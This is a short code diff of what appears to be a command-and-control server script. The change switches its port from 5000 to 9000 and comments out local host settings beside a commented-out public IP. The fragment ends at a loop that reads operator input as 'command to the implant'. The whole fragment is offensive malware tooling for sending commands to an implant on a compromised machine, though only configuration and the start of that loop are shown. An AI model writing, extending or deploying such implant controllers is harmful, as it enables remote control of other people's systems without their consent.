@@ -7,14 +7,14 @@ import base64
 from utils import *
 
 host = "localhost"
-port = 5000
+port = 9000
 
 baseurl = f'http://{host}:{port}'
 
 s = socket.socket()
 # host = "18.223.121.137"  # Get local machine name
-host = "127.0.0.1"
-port = 5000  # Reserve a port for your service
+# host = "127.0.0.1"
+# port = 5000  # Reserve a port for your service
 while True:  # Establish connection with client
     message = input("Enter command to the implant:\n")
     if message == "exit":
